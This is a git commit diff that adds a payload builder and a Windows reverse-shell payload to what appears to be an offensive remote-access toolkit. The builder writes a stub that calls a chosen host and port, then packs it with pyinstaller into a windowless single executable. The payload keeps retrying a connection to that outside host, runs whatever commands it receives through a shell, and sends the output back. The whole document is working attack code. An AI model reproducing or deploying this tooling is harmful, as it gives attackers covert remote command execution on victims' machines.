81b9d7453a4f7c86250e5876b41086b1b024ff4b
Whoami <90528494+whoami-99@users.noreply.github.com>
2021-09-16 19:13:17 -0700

    Add files via upload

---
+++ modules/whoami_payloads.py
@@ -0,0 +1,73 @@
+import os
+import platform
+import shutil
+from time import sleep
+
+RED = '\033[91m'
+GREEN = '\33[92m'
+END = '\033[0m'
+
+try:
+    import pathlib
+    
+except:
+    print(f"\n{RED}[!]{END} Failed To Import Packeges Try To Install It Manually Using The Following Command 'pip install -r requirements.txt'.")
+    exit()
+
+def show_payloads():
+    payloads = pathlib.Path("whoami_payloads/").glob("*.py")
+    
+    for file in payloads:
+        print(f'\n{GREEN}[+]{END} {file}')
+        
+def check_payload(payload):
+    if os.path.isfile(f"{payload}"):
+        return True
+    else:
+        return False
+
+def machine_os():
+    try:
+        machine_os = platform.system()
+        return machine_os
+
+    except Exception as e:
+        return(f"\n{RED}[!]{END} Failed To Get The Machine Os.")
+
+def clean(payload_name):
+    try:
+        os.remove(f"whoami-output/{payload_name}.py")
+        shutil.rmtree("build")
+
+        spec_clean = os.listdir(".")
+        for item in spec_clean:
+            if item.endswith(".spec"):
+                os.remove(os.path.join(".", item))
+
+        sleep(1)        
+        shutil.copyfile(f"dist/{payload_name}.exe", f"whoami-output/{payload_name}.exe")
+        shutil.rmtree("dist")
+        sleep(1)
+        print(f"\n{GREEN}[+]{END} Clean Has Been Completed")
+
+    except Exception as clean_error:
+        print(f"\n{RED}[!]{END} Failed To Clean {clean_error}.")
+
+def create_payload(payload , payload_name, payload_host, payload_port):
+    payload = payload.split("\\")[1]
+    payload = payload.split(".py")[0]
+    
+    try:
+
+        with open(f"whoami-output/{payload_name}.py", "w") as file:
+            file.write(f"from whoami_payloads.{payload} import connect\n")
+            file.write(f"connect('{payload_host}', {payload_port})\n")
+
+        os.system(f"pyinstaller --onefile --noconsole whoami-output/{payload_name}.py")
+        sleep(1)
+        clean(payload_name)
+        sleep(1)
+        print(f"\n{GREEN}[+]{END} Payload Created Succesfully.")
+
+    except Exception as create_error:
+        print(f"\n{RED}[!]{END} Failed To Create Payload {create_error}.")
---
+++ whoami_payloads/windows_reverse_shell.py
@@ -0,0 +1,33 @@
+import socket
+import subprocess
+import os
+from time import sleep
+
+def connect(payload_host, payload_port):
+    s = socket.socket()
+    host = payload_host
+    port = payload_port
+    connected = False
+
+    while not connected:
+        sleep(10)
+        try:
+            s.connect((host, port))
+            connected = True
+
+            while True:
+                data = s.recv(10240)
+
+                if data[:2].decode("utf-8") == 'cd':
+                    os.chdir(data[3:].decode("utf-8"))
+
+                if len(data) > 0:
+                    cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+                    output_byte = cmd.stdout.read() + cmd.stderr.read()
+                    output_str = str(output_byte,"utf-8")
+                    currentWD = os.getcwd() + "> "
+                    s.send(str.encode(output_str + currentWD))
+
+
+        except Exception as error:
+            print(error)
